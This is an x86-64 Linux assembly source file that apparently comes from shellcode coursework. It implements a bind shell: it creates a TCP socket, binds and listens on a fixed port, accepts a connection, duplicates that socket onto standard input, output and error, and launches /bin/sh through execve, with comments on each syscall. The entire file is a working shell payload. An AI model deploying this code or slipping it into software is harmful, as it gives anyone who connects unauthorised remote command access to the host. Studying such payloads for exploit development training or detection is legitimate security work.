;testbind.asm
bits 64
global _start
section .text
_start:
	xor r8, r8
	xor r9, r9
;socket(af_inet=2 (internet IP), sock_stream=1 (tcp), protocol=0(unspecified or same as addr fam))
;parameters/descriptions came from socket.h headerfile
	mov rdi, 2
	mov rsi, 1
	mov rdx, 0
	mov rax, 41
	syscall
	mov rdi, rax ; rdi has sock fd
; struct *sock_stream (help from: https://github.com/zerosum0x0/SLAE64/blob/master/bindshell/bindshell.asm)
	push rdx ; 0 out the stack for struct
  push rdx
  mov byte [rsp], 2    							; sockaddr.sa_family = AF_INET (u_char)
  mov word [rsp + 0x2], 0xc1df      ; sockaddr.sa_data[] = PORT (short)
  mov r8, rsp 											; r8 now holds struct addr
; bind(sock, *sock_struct, sockaddr_len)
	;rdi still has sock fd
	mov rsi, r8 ;struct 
  mov rdx, 16 ; len of addr (16 bytes)
  mov rax, 49
  syscall
;listen(sockfd, max_connex)
  ;rdi still has sockfd
	mov rsi, 2  ;2 max connex (my connex and any debug connex)
	mov rax, 50
	syscall
;accept(sock, *peer, sockaddr_len)
  ;rdi still has sockfd
	xor rsi, rsi
  mov rdx, 16
  mov rax, 43
  syscall
	mov r9, rax ; my new, connected fd
;close(fd)
	;rdi still holds old connection fd
  mov rax, 3
  syscall
;dupe
  xor r8, r8
  mov r8, 2 ; start at stderr and dup/dec down to zero
  .loop_fd:
      mov rdi, r9
      mov rax, 33 ;dup2
      mov rsi, r8
      syscall
  dec r8
  jns .loop_fd ;jump not sign-> checks SF
  
 ;execve("/bin//sh",*{"bin//sh","0x00"},'0x00')
  xor rax, rax
  push rax 										;null terminator
  mov rbx, 0x68732f2f6e69622f ;"/bin//sh"
  push rbx 										;push onto stack
  mov rdi, rsp 								;*file "/bin//sh"
  push rax										;null terminator
  mov rdx, rsp								;rdx has addr of last pushed null
  push rdi										;arg1
  mov rsi, rsp 								;rsp is pointing at null

  ; Call the Execve syscall
  add rax, 59
  syscall
